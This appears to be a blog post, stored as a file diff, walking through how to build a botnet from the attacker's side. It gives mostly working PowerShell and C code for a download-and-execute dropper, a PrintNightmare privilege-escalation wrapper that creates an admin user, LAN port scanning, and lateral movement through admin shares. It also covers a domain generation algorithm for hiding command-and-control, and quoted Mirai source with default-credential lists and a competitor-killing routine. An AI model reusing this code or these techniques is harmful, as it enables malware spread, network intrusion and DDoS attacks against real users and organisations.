@@ -1,0 +1,588 @@
+Here’s @0xf00, I no longer have access to this account, in a moment of genius, I managed to wipe my one and only backup, However I’ll be sharing articles both here and on github at 0xf00I.github.io 178.
+
+In this article, I will discuss the fundamentals of botnets dev, providing insights into their structure and operation. After stumbling upon a post titled “How does one create an IOT botnet?”, I thought about writing an article covering the fundamentals of botnet project I wrote a long time ago and how vulnerabilities are exploited by worms to propagate through networks. So, let’s start with a simple definition:
+
+What is a Botnet? In simple terms, a botnet is a network of computers infected by malware and controlled by a single entity or party.
+
+Botnets usually operate through three stages or more. In this article, I’ll go over each stage, explaining how they work, and provide code example. Finally, a detailed explanation, Let’s get started with our exploration of botnets and their inner workings.
+
+Entry Point
+The primary approach involves utilizing spam campaigns, This method is preferred due to its simplicity making it challenging to trace the origin of the initial infection or its source. The attack is mass rather then targeted, So, Typically you get an e-mails contain a malicious attachment that is often referred to as an invoice, and that’s usually the stage 1 of every infection “The malicious macro” a social engineering attempt to lure an unsuspecting victim into executing the payload of the document, In this article we gone wear the black hat and play the role.
+
+        Initial Access         Execution              Persistence
+             |                      |                      |
+             V                      V                      V
+[PrintNightmare Exploit] ---> [Malware Injection] ---> [Maintain Control]   
+
+    Command and Control     Actions on Objectives
+             |                      |
+             V                      V
+    [Phone Home to C&C] ---> [Initiate The Attack]   
+					                                   Figure 1
+In Figure 1, The malware operates multi-stage components that inject later stages into separate processes, First exploit a vulnerability for the sake of this article I’m gone deploy an old vulnerability Known as “Print Spooler Vulnerability” or “PrintNightmare” to infect vulnerable devices and spread the malware within the network, Next deployed our botnet and finally phone C&C to activated and attack is initiated. The main goal is to establishes a connection to a target server, receives instructions, and then launches the DDoS attack using multiple threads.
+
+The multi-stage approach has advantages despite the fact that creating complex, only one-phase could seem to be the best way of achieving our objective. By structuring the stages, I can reduce the impact if one fails or is detected too early. Because of its modular design, the operation stays simple and hidden even if one component is compromised, Given each stage will automatically activate self deletion if succeeds. Moreover, a multi-stage design allows us to modify and enhance the attack plan, creating a balance between complexity and simplicity enables us to obfuscate the command and control channel to make detection more difficult.
+
+Stage 1 - The dropped Powershell script
+During this phase, we assume that the target has fallen for our social engineering tactic and activated the embedded macro within the document. Upon opening the file, the contained code is executed, leading to the deployment of a PowerShell script.
+
+$urlArray = \"".split(\",\");
+$randomNumber = $randomGenerator.next(1, 65536);
+$downloadedFile = \"c:\windows\temp\";
+foreach($url in $urlArray){
+	try{
+		$webClient.downloadfile($url.ToString(), $downloadedFile);
+		start-process $downloadedFile;
+		break;
+	}catch{}
+}
+The script systematically cycles through a predefined list of domain names, attempting to retrieve the subsequent stage. Specifically, it targets the directory C:\windows\temp/. If the download is successful, the acquired file is executed. Should an error arise, the process continues with the next URL, as the catch clause is left empty. In a real-world scenario, Obfuscation would be taken to an advanced level.
+
+Stage 2 - Payload Delivery and Privilege Escalation
+When this phase is triggered, the next stage involves checking a set of conditions before proceeding to download the malware, These conditions help ensure controlled execution “I do not want shoot myself”
+
+Next, essential host information is gathered from the system, and a check for administrative privileges is conducted. If the current user lacks such privileges, the script will relaunch with elevated permissions. The ultimate objective is to determine if the current user has administrative access; if not, an attempt to escalate privileges ensues by leveraging the PrintNightmare vulnerability.
+
+in this example.we’re utilizing CVE-2021-34527, known as PrintNightmare, for a Local Privilege Escalation (LPE) scenario using a purely PowerShell-based approach. The provided PowerShell script executes the PrintNightmare attack technique, aiming to elevate local privileges on the system.
+
+This function is designed to automate the exploitation of the CVE-2021-34527, commercing by loading and executing a PowerShell script containing the exploit code you can find on github 18, and it checks for successful privilege escalation
+
+In simple term’s the (poc)exploit objective is to escalate privileges by leveraging the PrintNightmare vulnerability. It first generates a payload DLL, constructs custom structures, and then attempts to load the payload as a printer driver.
+
+Let’s break down some key functionalities (PoC):
+
+The heart of the exploit is encapsulated within the Invoke-Nightmare function. This function is responsible for creating and executing the exploit payload.
+
+2. Parameters:
+
+The Invoke-Nightmare function accepts the following parameters:
+
+$DriverName: A string parameter, which may be set to a benign name.
+$NewUser: A string parameter, representing the new username for privilege escalation.
+$NewPassword: A string parameter, representing the new password for privilege escalation.
+$DLL: A string parameter, which can be used to provide a custom payload DLL (Dynamic Link Library) or left empty to generate a payload.
+3. DLL Generation and Customization:
+
+If $DLL is not provided (empty), the PoC generates a malicious DLL payload by:
+Obtaining the payload data as a base64-encoded string using the get_nightmare_dll function.
+Converting the base64 string to byte data.
+Encoding the new username and password into the payload, if provided.
+Saving the payload as a temporary DLL file (nightmare.dll) in the system’s temporary directory.
+We store the payload as a string. It decodes a base64-encoded string into a PowerShell script, presumably containing the code to exploit CVE-2021-34527 (PrintNightmare).
+
+Checking for Admin Privileges:
+The function begins by checking if the current user has administrator privileges using a custom function or cmdlet called Test-Admin. If the user already has admin privileges, the exploit is not executed, as there is no need for further escalation.
+
+function PrivEsc {
+    if (-not (Test-Admin)) {
+        $NightmareCVE = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($PrintNightmare))
+        $d_path = "c:/users/$env:USERNAME/appdata/local/temp/$(Get-RandomString (Get-Random -Minimum 5 -Maximum 12))"
+        Set-Content -Path "$d_path.ps1" -Value $NightmareCVE
+        $try_nightmare = Invoke-Expression -Command "Import-Module $d_path.ps1; Invoke-Nightmare -NewUser '$env:USERNAME' -NewPassword '0xph001234!!'"
+        if (Test-Admin) {
+            Write-Host "got admin!"
+            return $true
+        }
+        $check_imp = Invoke-Expression -Command 'whoami /priv' | ForEach-Object { $_.ToLower() }
+        foreach ($line in $check_imp) {
+            if ($line -match 'seimpersonateprivilege' -and $line -match 'enabled') {
+            }
+        }
+    }
+    return $false
+}
+Executing the Exploit:
+Next, Creates a new PowerShell script file in the random directory path ("$d_path.ps1") and writes the decoded exploit code ($NightmareCVE) into the file, attempts to execute the PowerShell script using Invoke-Expression. It imports the module (Import-Module $d_path.ps1) and passes parameters to the Invoke-Nightmare function, including a new username and password. ($env:USERNAME) and a new password ('0xph001234!!').
+
+After executing the exploit, the script checks again for admin privileges using Test-Admin. If the user now has admin privileges, it writes “got admin!” to the console and returns true, indicating a successful privilege escalation, and finally we execute whoami /priv to check for a successful Exploitation or if the malware is unable to, or if they already have admin privileges before running the code.
+
+Stage 3 - Network Enumeration and Propagation
+In this phase, we conduct network enumeration, identify vulnerable ports, and exploit open ports for potential propagation. This phase involves:
+
+pivotal in identifying local network addresses, particularly those associated with common private IP ranges. By excluding the ‘lo’ interface, which pertains to the local loopback, this function establishes a basis for subsequent actions involving local network enumeration.
+
+Fundamentally, This process of pinpointing these local addresses is what furnishes us with the indispensable intelligence we require.
+
+function Get-LAN {
+    $interfaces = [Net.NetworkInformation.NetworkInterface]::GetAllNetworkInterfaces()
+    $localIP = @()
+
+    foreach ($interface in $interfaces) {
+        if ($interface.Name -eq 'lo') {
+            continue
+        }
+        
+        $iface = $interface.GetIPProperties().UnicastAddresses | Where-Object { $_.Address.AddressFamily -eq 'InterNetwork' }
+        if ($iface -ne $null) {
+            foreach ($j in $iface) {
+                $addr = $j.Address.IPAddressToString
+                if ($addr -match '^192\.168|^172\.16') {
+                    $localIP += $addr
+                }
+            }
+        }
+    }
+    return $localIP
+}
+
+Utilizing the System.Net.NetworkInformation.NetworkInterface class, it retrieves a list of network interfaces present on the local system.
+
+It filters out the ‘lo’ interface (loopback), which is typically used for local testing and doesn’t provide relevant network information.
+
+For each network interface, it extracts the IPv4 addresses that belong to common private IP ranges (e.g., 192.168.x.x, 172.16.x.x).
+
+These identified local IP addresses are collected and stored in the $localIP array, which forms the foundation for subsequent actions related to local network enumeration.
+
+Next, our objective to pinpoint vulnerable ports within the local network. first leverages the IP addresses obtained from the Get-LAN function and iterates through a list of ports that are commonly exploited by attackers.
+
+function Get-VulnPorts {
+    $vulnPorts = @('445', '3389', '5985')
+    $vuln = @{}
+    $localIP = Get-LAN
+
+    foreach ($addr in $localIP) {
+        $ipParts = $addr -split '\.'
+        $range = [ipaddress]::Parse("$($ipParts[0]).$($ipParts[1]).1.0/24")
+
+        foreach ($ip in $range.AddressList) {
+            foreach ($port in $vulnPorts) {
+                $client = New-Object System.Net.Sockets.TcpClient
+                $result = $client.BeginConnect($ip, $port, $null, $null)
+                $wait = $result.AsyncWaitHandle.WaitOne(100, $false)
+                if ($wait -and !$client.Connected) {
+                    if ($vuln.ContainsKey($ip.ToString())) {
+                        $vuln[$ip.ToString()] += ",$port"
+                    } else {
+                        $vuln[$ip.ToString()] = $port
+                    }
+                }
+                $client.Close()
+            }
+        }
+    }
+    return $vuln
+}
+For each IP address and port combination, the function tests the ability to establish a connection. Failed connections prompt recording of the IP and port in the $vuln hash table, indicating potential security weaknesses.
+
+It maintains a predefined list of commonly exploited vulnerable ports, including 445 (SMB), 3389 (RDP), and 5985 (WinRM).
+
+For each local IP address, the function iterates through the list of vulnerable ports and attempts to establish a connection using System.Net.Sockets.TcpClient.
+
+If a connection attempt fails (indicating an open port), the function records both the IP address and the port number in the $vuln hash table. This hash table provides a comprehensive list of potential security weaknesses within the local network.
+
+This one is self explanatory we builds on insights from the Get-VulnPorts function.and focuses on exploiting open ports. Specifically, if a vulnerable port corresponds to SMB (port 445).
+
+function Abuse-OpenPorts {
+    $smb = '445'
+    $mstsc = '3389'
+    $ports = Get-VulnPorts
+
+    foreach ($ip in $ports.Keys) {
+        $openPorts = $ports[$ip] -split ','
+
+        foreach ($port in $openPorts) {
+            if ($port -eq $smb) {
+                Drop-OnShare $ip
+            } elseif ($port -eq $mstsc) {
+                MSTSC-Nightmare $ip
+            }
+        }
+    }
+}
+Checking whether the vulnerable ports identified in the previous step correspond to specific services, such as SMB (port 445) or RDP (port 3389).
+
+Depending on the service associated with an open port, the function invokes corresponding functions, such as Drop-OnShare or MSTSC-Nightmare, to escalate the potential vulnerability.
+
+For open ports that match SMB (port 445), the Drop-OnShare function is called to exploit shared network resources on remote systems.
+
+For open ports corresponding to RDP (port 3389), the function invokes the MSTSC-Nightmare function to further exploit the potential vulnerability.
+
+If pass the function invokes Drop-OnShare to execute actions targeting shared resources. Similarly, if the vulnerable port matches RDP (port 3389), MSTSC-Nightmare is invoked to further exploit the situation.
+
+and finally leveraging information gathered to exploit shared network resources on remote systems. Its core functionalities include payload delivery and lateral movement:
+
+function Drop-OnShare($ip) {
+    $payload = @"
+    (New-Object Net.WebClient).DownloadFile('', 'C:\phoo.exe')
+    Start-Process 'C:\'
+"@
+    
+    $defaultShares = @('C$', 'D$', 'ADMIN$')
+    $availableDrive = Get-PSDrive -Name 'Z' -ErrorAction SilentlyContinue
+
+    if ($availableDrive -eq $null) {
+        $availableDrive = Get-PSDrive -Name ('A'..'Z' | Where-Object { Test-Path $_: -PathType Container } | Select-Object -First 1)
+    }
+
+    foreach ($share in $defaultShares) {
+        try {
+            $sharePath = "\\$ip\$share"
+            if (Test-Path -Path $sharePath) {
+                $null = Invoke-Expression -Command "net use $($availableDrive.Name): $sharePath /user:username password 2>&1"
+                if (Test-Path -Path "$($availableDrive.Name):") {
+                    $payloadPath = "$($availableDrive.Name):\aaaa.ps1"
+                    $payload | Set-Content -Path $payloadPath
+                    $null = Invoke-Expression -Command "powershell -ExecutionPolicy Bypass -File $payloadPath"
+                    Remove-Item -Path $payloadPath
+                    $null = Invoke-Expression -Command "net use $($availableDrive.Name): /delete /yes"
+                }
+            }
+        }
+        catch {}
+    }
+}
+The primary purpose of the Drop-OnShare($ip) function is to utilize the inherent vulnerabilities of shared network resources to distribute and execute malicious payloads on remote systems. By taking advantage of administrative shares, the function aims to achieve the following goals:
+
+Payload Delivery: The function utilizes an embedded PowerShell payload within the script to download a malware file (phoo.exe) and initiate its execution on the target system.
+
+Lateral Movement: By taking advantage of administrative shares (C$, D$, ADMIN$), the function facilitates lateral movement within the network. It maps these shares to drive letters.
+
+For each default administrative share (C$, D$, ADMIN$), it attempts to map the share to the available drive using the net use command with supplied credentials (username and password), If the share mapping is successful, the payload is written to a file on the remote system, executed, and then removed.
+
+Stage 4 – The binary
+Once the conditions are met and the execution proceeds as planned, the user’s device becomes part of our botnet. The next step involves our bot binary identifying and connecting to a Command and Control (C&C) server for exchanging messages. This connection may be established using either a hardcoded IP address or domain name.
+
+Next, We develop an algorithm that generates predictable domain names associated with the C&C server. This algorithm’s specifics are known only to the C&C server operators, making it difficult to extract or block communication based on domain names.
+
+Domain Generation Algorithms (DGAs):
+For this part the DGA used generated domain names based on various parameters, including the current date and time.
+
+Features
+Daily Domain Generation: The DGA can generate up to 50 different domain names per day. This high degree of variability ensures that the C&C server can rapidly adapt to changing circumstances, making it challenging for security analysts to predict and block communication.
+
+Multiple Domain Testing: To further confound detection efforts, the malware will test up to 20 different domains in succession. Each domain is tested only once, reducing the risk of patterns emerging in communication behavior.
+
+Delay Mechanism: There is a built-in 5s wait time between attempts to connect to new domains. This delay helps the botnet avoid triggering suspicion by flooding network traffic with connection attempts.
+
+The domain generation routine first generates a seed which depends on the sequence number and system time. The seed is built using cryptographic hashes. The hashing algorithm is SHA256, The seed is generated as follows:
+
+    // Update SHA-256 hash with sequence number
+    SHA256_CTX sha256_context;
+    SHA256_Init(&sha256_context);
+    SHA256_Update(&sha256_context, &seq_nr, sizeof(seq_nr));
+
+    // Update SHA-256 hash with year, month, and day
+    SHA256_Update(&sha256_context, &date->tm_year, sizeof(date->tm_year));
+    SHA256_Update(&sha256_context, &date->tm_mon, sizeof(date->tm_mon));
+    SHA256_Update(&sha256_context, &date->tm_mday, sizeof(date->tm_mday));
+
+    // Finalize the SHA-256 hash
+    unsigned char sha256_result[SHA256_DIGEST_LENGTH];
+    SHA256_Final(sha256_result, &sha256_context);
+
+    // Convert SHA-256 hash to hex string
+    for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) {
+        snprintf(domain_parts + i * 2, 3, "%02x", sha256_result[i]);
+    }
+
+The core function generates a complete domain name:
+
+It selects a random suffix from a predefined list.
+Calculates the SHA-256 hash, year, month, and day.
+Converts the SHA-256 hash to a hexadecimal string.
+Generates additional domain parts based on the hex values from the hash.
+Appends the selected suffix to complete the domain name.
+Entry point:
+
+Seeds the random number generator with the current time.
+Enters a loop to generate 50 domain names, each unique due to the random sequence number and date.
+For each iteration, it generates a random sequence number, retrieves the current date, calls create_domain to generate a domain name, and tested it. It then waits for 5 seconds before the next iteration.
+Top Level Domain :
+The code defines an array called suffixes that contains a list of possible top-level domain (TLD) suffixes. These suffixes represent the highest level of the domain hierarchy (e.g., “.xyz,” “.cool,” “.ninja”).
+
+
+const char *suffixes[] = {".xyz", ".cool", ".ninja"};
+To create domain names with different TLDs, the code randomly selects one of the suffixes from the suffixes array. This random selection introduces variability into the generated domain names.
+
+int suffix_index = rand() % (sizeof(suffixes) / sizeof(suffixes[0]));
+After generating the domain name parts (based on the sequence number, date-based elements, the selected suffix is appended to the domain name.
+
+strcat(domain_parts, suffixes[suffix_index]);
+Suppose suffixes contains three TLD suffixes: “.xyz,” “.cool,” and “.ninja.”
+
+During the execution of the create_domain function, a random number between 0 and 2 is generated to select one of these suffixes.
+
+For instance, if suffix_index is 1 (indicating “.cool”), the generated domain name will include “.cool” as the top-level domain. The rest of the domain name is constructed based on the sequence number, date, and additional parts.
+
+C Code of the DGA
+
+// Function to generate a cryptographically secure random number
+uint32_t generate_random_sequence() {
+    uint32_t seq_nr;
+    if (RAND_bytes((unsigned char *)&seq_nr, sizeof(seq_nr)) != 1) {
+        // Handle random number generation failure
+        fprintf(stderr, "Error generating random sequence number.\n");
+        exit(1);
+    }
+    return seq_nr;
+}
+
+// Function to convert a hex string to an integer
+uint32_t hex_to_int(const char *hex) {
+    uint32_t result = 0;
+    for (int i = 0; hex[i] != '\0'; i++) {
+        result <<= 4;
+        if (hex[i] >= '0' && hex[i] <= '9') {
+            result += hex[i] - '0';
+        } else if (hex[i] >= 'a' && hex[i] <= 'f') {
+            result += hex[i] - 'a' + 10;
+        }
+    }
+    return result;
+}
+
+// Function to generate a domain part
+void generate_domain_part(uint32_t seed, int nr, char *part) {
+    int i = 0;
+    while (nr > 1) {
+        uint32_t edx = seed % 36;
+        seed /= 36;
+        char char_value;
+        if (edx > 9) {
+            char_value = 'a' + (char)(edx - 10);
+        } else {
+            char_value = '0' + (char)edx;
+        }
+        part[i++] = char_value;
+        if (seed == 0) {
+            break;
+        }
+        nr--;
+    }
+    part[i] = '\0';
+    // Reverse the part in place
+    int len = strlen(part);
+    for (int j = 0; j < len / 2; j++) {
+        char temp = part[j];
+        part[j] = part[len - j - 1];
+        part[len - j - 1] = temp;
+    }
+}
+In summary, the code constructs domain names by combining multiple elements, including a random TLD suffix, a SHA-256 hash of the sequence number and date, and additional domain parts generated from the hash. This approach aims to create unique and unpredictable domain names.
+
+// Function to create a domain
+void create_domain(uint32_t seq_nr, struct tm *date, char *domain) {
+    // Define an array of possible suffixes
+    const char *suffixes[] = {".xyz", ".cool", ".ninja"};
+
+    // Calculate a random index to select a suffix
+    int suffix_index = rand() % (sizeof(suffixes) / sizeof(suffixes[0]));
+
+    // Calculate the total length of domain_parts
+    size_t total_length = SHA256_DIGEST_LENGTH * 2 + strlen(suffixes[suffix_index]) + 1;
+
+    // Dynamically allocate memory for domain_parts
+    char *domain_parts = (char *)malloc(total_length);
+
+    // Ensure successful allocation
+    if (domain_parts == NULL) {
+        fprintf(stderr, "Memory allocation failed.\n");
+        exit(1);
+    }
+
+    // Initialize domain_parts as an empty string
+    domain_parts[0] = '\0';
+
+    // Update SHA-256 hash with sequence number
+    SHA256_CTX sha256_context;
+    SHA256_Init(&sha256_context);
+    SHA256_Update(&sha256_context, &seq_nr, sizeof(seq_nr));
+
+    // Update SHA-256 hash with year
+    SHA256_Update(&sha256_context, &date->tm_year, sizeof(date->tm_year));
+
+    // Update SHA-256 hash with month
+    SHA256_Update(&sha256_context, &date->tm_mon, sizeof(date->tm_mon));
+
+    // Update SHA-256 hash with day
+    SHA256_Update(&sha256_context, &date->tm_mday, sizeof(date->tm_mday));
+
+    // Finalize the SHA-256 hash
+    unsigned char sha256_result[SHA256_DIGEST_LENGTH];
+    SHA256_Final(sha256_result, &sha256_context);
+
+    // Convert SHA-256 hash to hex string
+    for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) {
+        snprintf(domain_parts + i * 2, 3, "%02x", sha256_result[i]);
+    }
+
+    // Generate domain parts
+    for (int i = SHA256_DIGEST_LENGTH * 2; i < total_length - strlen(suffixes[suffix_index]); i += 8) {
+        uint32_t seed = hex_to_int(domain_parts + i);
+        char part[9];
+        generate_domain_part(seed, 8, part);
+        strcat(domain_parts, part);
+    }
+
+    // Append the selected suffix to the domain_parts
+    strcat(domain_parts, suffixes[suffix_index]);
+
+    // Copy the generated domain to the output parameter
+    strcpy(domain, domain_parts);
+
+    // Free the dynamically allocated memory
+    free(domain_parts);
+}
+
+int main() {
+    // Seed the random number generator
+    srand(time(NULL));
+
+    for (int i = 0; i < 50; i++) {
+        uint32_t seq_nr = generate_random_sequence();  // Generate a random sequence number
+        time_t rawtime;
+        struct tm *date;
+
+        time(&rawtime);
+        date = localtime(&rawtime);
+
+        char domain[160]; // Increased buffer size to accommodate the longer SHA-256 hash
+        create_domain(seq_nr, date, domain);
+
+        //  !!! (replace this )
+        // Code here !!! 
+
+        printf("Testing domain: %s\n", domain);
+
+        // Wait for 5 seconds
+        sleep(5);
+    }
+
+    return 0;
+}
+Domain Resolution:
+
+When a bot needs to establish communication with the C&C server, it calculates the current domain name using the DGA algorithm.
+The algorithm generates a domain name that the bot will attempt to resolve into an IP address.
+
+C&C Server Setup:
+
+The botnet configure a large number of domain names corresponding to possible future C&C servers, These domain names are registered in advance.
+
+Dynamic Resolution Attempt:
+
+When the bot attempts to connect to the C&C server, it tries to resolve the generated domain name into an IP address.
+The domain name may not exist initially, but at some point in the future, the author will register one of the pre-generated domain names, associating it with the IP address of the actual C&C server.
+
+Final Stage - Phone Home
+Generating domain names is just one aspect of communication with a C&C server. To establish communication with a C&C server, typically needs additional functionality, such as:
+
+Network Communication: The code needs to communicate over the network, typically using protocols like HTTP, HTTPS, or custom protocols. This would involve creating sockets, sending requests to the C&C server, and receiving responses, Next, Command Parsing and Data Encryption/Decryption C&C communications are encrypted to hide the actual content from network monitoring, Persistence and finally, Data Exfiltration.
+
+Our botnet should:
+
+Include a master node that controls all other nodes on the network, Deploy disguised malware/slave nodes on host computers transmit commands from the master node to the slave node, execute, and return an output back to us
+
+Initiation:
+int channel = //initiate a channel given SERVER, PORT, and name;
+Next, Let’s define the actual connection between master and slave! To do this, define a network socket through which data can be sent. Think of master as having many ‘electrical sockets’. Now, we need to build a ‘plug’ on slave that fits master’s ‘wall sockets’. We can do this using the socket library’s socket() function. How convenient! socket() takes in 3 arguements: communications domain, socket type, and a protocol. For communication’s domain, you probably already guessed it: AF_INET. For socket type, we want our socket to be one that simply streams data both directions. Hence, use the given macro SOCK_STREAM Let’s not worry about the socket protocol.
+
+int init_channel (char *ip, int port, char *name) {
+	char msg[CMD_LENGTH];
+	struct sockaddr_in server;
+
+	server.sin_addr.s_addr = //convert the ip to network byte order
+	server.sin_family = //set the server's communications domain
+  server.sin_port = //convert port to network byte order
+  
+  int channel = //define a SOCK_STREAM socket
+  
+  if(channel < 0) {
+    perror ("socket:");
+    exit(1);
+  }
+  
+  int connection_status = //use the defined channel to connect the slave to the master server
+  
+  if (connection_status < 0) {
+    perror ("connect:");
+    exit(1);
+  }
+
+  respond (channel, msg);
+  return channel;
+}
+This is a fairly fundamental network. The function returns an int representing the socket. Store this value in channel. Next, we want to jump start our socket (plugging slave into master’s wall socket(). Call the C function connect(). This takes in three arguments: the channel, the sockaddr struct, and the size of the struct in bytes. If connect() returns a positive integer, your connection with master was successful! In order to test our newfound connection, let’s send a greeting to master! Populate our message buffer and use respond() to send msg through channel back to master. Finally, we want the init_channel() function to return this successful connection.
+
+Listening for messages:
+Once the slave is connected to the master, it needs to constantly be listening for messages and act immediately upon a command. So, let’s use an infinite while loop to receive and parse these messages, below the printf statement, add an infinite while loop that calls two functions: recieve() and parse() in that order. Both functions take the channel and msg stack buffer as arguments. This should look something like:
+
+Infinite Loop {
+  recieve(...);
+  parse(...);
+}
+Also It’s important to note that having a large number of bots attempting to connect to a single C&C server simultaneously can inadvertently launch a Distributed Denial of Service (DDoS) attack against the server. To address this, we adopt a hierarchical structure where groups of bots, typically in batches of a fixed number like 50, report to intermediary nodes. These nodes can be part of the botnet and may further relay requests and responses to other nodes before reaching the main C&C server. This division of labor helps distribute the load and reduces the risk of DDoS attacks on the primary C&C server.
+
+Final Notes and Analysis
+Our botnet is still pretty uninteresting; I avoided the most interesting part for obvious reasons: this is not true malware; it only has to teach you the basics. A botnet is an interesting piece of code and requires a skilled coder, not necessarily an experienced one. Understanding networking protocols, including TCP/IP, DNS, and HTTP, Also, some exploit development is initiated through the exploitation of vulnerabilities. Setting up and maintaining C&C servers to issue commands to botnet nodes is one of the most important things to consider because it has many aspects. One of them is maintaining the OpSec of the botnet infrastructure and its operators. Implementing encryption and cryptographic techniques Planning for infections, spreading, and having a killswitch if things go sideways, which they always do,
+
+Let’s take, for example, the Mirai malware, for which I explained a code snippet of the leaked source code in the original post. Mirai is one of the successfully operated With over a quarter billion CCTV cameras around the world alone, as well as the continued growth of other IoT devices infected. So let’s revisit some of the functionalities. The malware performs wide-ranging scans of IP addresses to locate under-secured IoT devices that could be remotely accessed via easily guessable login credentials.
+
+github.com
+soufianetahiri/Mirai-Botnet/blob/master/mirai/bot/scanner.c#L123 13
+iph->ttl = 64;
+iph->protocol = IPPROTO_TCP;
+// Set up TCP header
+tcph->dest = htons(23);
+tcph->source = source_port;
+tcph->doff = 5;
+tcph->window = rand_next() & 0xffff;
+tcph->syn = TRUE;
+// Set up passwords
+add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x41\x11\x17\x13\x13", 10);                     // root     xc3511
+add_auth_entry("\x50\x4D\x4D\x56", "\x54\x4B\x58\x5A\x54", 9);                          // root     vizxv
+add_auth_entry("\x50\x4D\x4D\x56", "\x43\x46\x4F\x4B\x4C", 8);                          // root     admin
+add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x46\x4F\x4B\x4C", 7);                      // admin    admin
+add_auth_entry("\x50\x4D\x4D\x56", "\x1A\x1A\x1A\x1A\x1A\x1A", 6);                      // root     888888
+add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x4F\x4A\x46\x4B\x52\x41", 5);                  // root     xmhdipc
+add_auth_entry("\x50\x4D\x4D\x56", "\x46\x47\x44\x43\x57\x4E\x56", 5);                  // root     default
+add_auth_entry("\x50\x4D\x4D\x56", "\x48\x57\x43\x4C\x56\x47\x41\x4A", 5);              // root     juantech
+add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x17\x14", 5);                      // root     123456
+add_auth_entry("\x50\x4D\x4D\x56", "\x17\x16\x11\x10\x13", 5);                          // root     54321
+One of Mirai’s key features is its ability to launch HTTP floods and various network-layer (OSI layer 3-4) DDoS attacks. It can execute GRE IP and GRE ETH floods, SYN and ACK floods, STOMP floods, DNS floods, and UDP flood attacks.
+
+Interestingly, Mirai includes a hardcoded list of IPs that its bots are programmed to avoid during scans. This list, which you can find below, includes the US Postal Service, the Department of Defense, the Internet Assigned Numbers Authority (IANA) and IP ranges belonging to Hewlett-Packard and General Electric.
+
+github.com
+soufianetahiri/Mirai-Botnet/blob/master/mirai/bot/scanner.c#L674 7
+    addr.sin_family = AF_INET;
+    addr.sin_addr.s_addr = conn->dst_addr;
+    addr.sin_port = conn->dst_port;
+    conn->last_recv = fake_time;
+    conn->state = SC_CONNECTING;
+    connect(conn->fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
+}
+static ipv4_t get_random_ip(void)
+{
+    uint32_t tmp;
+    uint8_t o1, o2, o3, o4;
+    do
+    {
+        tmp = rand_next();
+        o1 = tmp & 0xff;
+        o2 = (tmp >> 8) & 0xff;
+I find this rather intriguing because one of the principles I always aimed to follow in software development, including malware, is to avoid hardcoding simple code. Yet, it’s fascinating that Mirai, despite its simplistic approach, was eventually used in one of the most prominent cyberattacks to date, Mirai even searches for and eliminates the competing IoT malware known as “Anime.” It does this by identifying the malware’s presence through its executable path and then terminating and removing it from the compromised device.
+
+github.com
+soufianetahiri/Mirai-Botnet/blob/master/mirai/bot/killer.c#L187 6
+ptr_exe_path += util_strcpy(ptr_exe_path, table_retrieve_val(TABLE_KILLER_EXE, NULL));
+// Store /proc/$pid/status into status_path
+ptr_status_path += util_strcpy(ptr_status_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
+ptr_status_path += util_strcpy(ptr_status_path, file->d_name);
+ptr_status_path += util_strcpy(ptr_status_path, table_retrieve_val(TABLE_KILLER_STATUS, NULL));
+table_lock_val(TABLE_KILLER_PROC);
+table_lock_val(TABLE_KILLER_EXE);
+// Resolve exe_path (/proc/$pid/exe) -> realpath
+if ((rp_len = readlink(exe_path, realpath, sizeof (realpath) - 1)) != -1)
+{
+    realpath[rp_len] = 0; // Nullterminate realpath, since readlink doesn't guarantee a null terminated string
+    table_unlock_val(TABLE_KILLER_ANIME);
+    // If path contains ".anime" kill.
+    if (util_stristr(realpath, rp_len - 1, table_retrieve_val(TABLE_KILLER_ANIME, NULL)) != -1)
+    {
+        unlink(realpath);
+        kill(pid, 9);
+The goal of this is obvious Mirai maximize the attack potential of the botnet devices, “Rise Up And Kill Him First”, These offensive and defensive measures are common among malware authors.
+
+In conclusion, these were some of the intriguing aspects I found within this source code. They underscore the delicate balance between the complexity and simplicity of malware development; achieving success in infiltrating advanced systems often doesn’t require advanced and sophisticated malware. Instead, it frequently comes down to human error and the art of social engineering. To this day, social engineering remains one of the most effective techniques for spreading malware or executing offensive operations.
+
